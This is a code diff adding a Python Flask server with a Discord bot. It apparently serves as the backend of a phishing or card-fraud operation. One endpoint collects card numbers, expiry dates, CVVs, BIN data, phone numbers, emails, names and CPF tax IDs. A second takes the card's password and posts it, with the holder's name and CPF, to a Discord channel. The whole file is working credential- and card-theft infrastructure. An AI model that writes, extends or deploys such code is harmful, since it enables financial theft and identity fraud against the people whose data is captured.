@@ -1,0 +1,121 @@
+import os
+import threading
+import asyncio
+import discord
+from discord.ext import commands
+from flask import Flask, request, jsonify
+from model.cardModel import Card
+
+app = Flask(__name__)
+
+# Load tokens and configuration from environment variables
+DISCORD_TOKEN = os.getenv("TOKEN")
+# Ensure that DISCORD_CHANNEL_ID is set in the environment; it should be an integer.
+try:
+    DISCORD_CHANNEL_ID = int(os.getenv("DISCORD_CHANNEL_ID", "0"))
+except ValueError:
+    DISCORD_CHANNEL_ID = 0
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# List to store card objects
+cards: list[Card] = []
+
+
+@app.route('/auth', methods=['GET'])
+def authInfo():
+    try:
+        data = request.json
+        required_fields = [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]
+
+        if not data or not all(key in data for key in required_fields):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        # Extract fields from the request JSON
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card_data = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        token_value = data.get('token')
+        bin_val = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        new_card = Card(
+            celular, operadora, valor, email, nome, cpf,
+            card_data, mes, ano, cvv, token_value, bin_val, dadosbin
+        )
+        cards.append(new_card)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print("Error in /auth:", ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@app.route('/authpass', methods=['GET'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in ['senha', 'token']):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        senha = data.get('senha')
+        token_req = data.get('token')
+
+        # Look for the card that matches the provided token
+        for card_obj in cards:
+            if card_obj.token == token_req:
+                # Retrieve the Discord channel using the channel ID from environment variables
+                channel = bot.get_channel(DISCORD_CHANNEL_ID)
+                if channel:
+                    message = (
+                        f"Received auth password: {senha} for card belonging to "
+                        f"{card_obj.nome} (CPF: {card_obj.cpf})"
+                    )
+                    # Schedule the coroutine to send the Discord message in the bot's event loop
+                    asyncio.run_coroutine_threadsafe(channel.send(message), bot.loop)
+                else:
+                    print("Discord channel not found. Check DISCORD_CHANNEL_ID.")
+                break
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print("Error in /authpass:", ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+def run_discord_bot():
+    # This will block and run the discord bot client.
+    bot.run(DISCORD_TOKEN)
+
+
+if __name__ == "__main__":
+    # Start the Discord bot in a separate thread so that Flask can run concurrently.
+    discord_thread = threading.Thread(target=run_discord_bot)
+    discord_thread.start()
+
+    # Run the Flask app
+    app.run(host="0.0.0.0", port=5000)
